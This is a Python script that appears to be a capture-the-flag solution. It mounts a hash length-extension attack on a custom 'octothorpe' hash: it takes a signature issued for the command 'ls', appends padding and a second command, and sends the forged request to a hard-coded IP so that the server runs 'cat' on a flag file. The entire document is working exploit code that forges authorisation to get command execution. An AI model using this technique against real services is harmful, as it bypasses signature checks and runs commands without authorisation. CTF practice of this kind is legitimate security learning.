#!/usr/bin/env python3
from datetime import datetime, timedelta, timezone
from octothorpe import octothorpe
from urllib.parse import quote_from_bytes
import requests
import json
import base64

SECRET_LEN = 32
# WEBSITE_URL = b"http://localhost:8832"
WEBSITE_URL = b"http://157.90.22.14:8832"
RUN_URL = WEBSITE_URL + b"/api/run"
AUTH_URL = WEBSITE_URL + b"/api/authorize"
CMD = b"cat /flag_rFZaZ80RoZ67X7QQuzxZLDTV.txt"

def main():
    r = requests.get(AUTH_URL, {"cmd" : "ls"}, allow_redirects=False)
    orig_signature = r.cookies["signature"]
    h = octothorpe(_state=bytearray.fromhex(orig_signature), _length=128)
    h.update(b"&cmd=" + CMD)
    forged_signature = h.hexdigest()

    expiry = int((datetime.now(timezone.utc) + timedelta(seconds=15)).timestamp())
    expiry_arg = b'expiry=' + str(expiry).encode() + b'&'

    # We got it statically, but it is calculatble (see octothorpe::_finalize)
    concated_bytes = b"\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x01\x00\x00\x00\x00\x00\x00"
    forged_url = RUN_URL + b"?" + expiry_arg + b"cmd=ls" + quote_from_bytes(concated_bytes).encode() + b"&cmd=" + quote_from_bytes(CMD).encode()
    r = requests.get(forged_url, cookies={"signature": forged_signature})
    print(r, r.content)
    if r.status_code == 200:
        res = json.loads(r.content)
        print(base64.b64decode(res["stdout"]))
        print(base64.b64decode(res["stderr"]))


if __name__ == "__main__":
    main()